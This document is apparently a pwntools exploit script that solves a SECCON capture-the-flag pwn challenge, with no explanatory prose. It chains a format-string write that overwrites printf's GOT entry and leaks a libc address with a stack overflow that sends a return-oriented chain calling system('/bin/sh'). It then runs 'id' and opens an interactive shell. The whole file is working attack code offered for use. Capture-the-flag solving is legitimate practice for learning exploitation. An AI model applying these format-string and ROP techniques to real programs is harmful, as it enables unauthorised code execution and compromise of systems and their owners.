from pwn import *

context.log_level = 'debug'

printf_got = 0x0404028
scanf_got = 0x0404030
scanf_plt = 0x4010A0
pop_rdi = 0x0000000000401283
ret = 0x000000000040101a

libc = ELF('./libc.so.6')
while True:
    e = ELF('./chall_patched')
    p = process(e.path)

    pay =b''
    pay += b"%32256c%8$hn%1$p"
    pay += b'A' * (0x10 - len(pay))
    pay += p64(e.got['printf'])[:-1]

    p.sendlineafter(b'"What is your name?", the black cat asked.\n', pay)
    try:

        p.recvn(32256)
        leak = int(p.recv(14).decode(), 16)
        lb = leak - 0x1b28c0
        system = lb + libc.sym['system']
        binsh = lb + list(libc.search(b'/bin/sh'))[0]
        log.critical(f"leak: {hex(leak)}")
        log.critical(f"lb: {hex(lb)}")
        log.critical(f"system: {hex(system)}")
        log.critical(f"binsh: {hex(binsh)}")
        p.recv()
        pay = b' answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted '
        pay += b'A' * 0x28
        pay += p64(ret)
        pay += p64(pop_rdi)
        pay += p64(binsh)
        pay += p64(system)
        pay += b' warmly.sdf\n'
        p.sendline(pay)

        p.sendline(b'id')
        tmp = p.recv()
        print(tmp)
        break
    except Exception as e:
        print(e)
        p.close()
        continue

p.interactive()
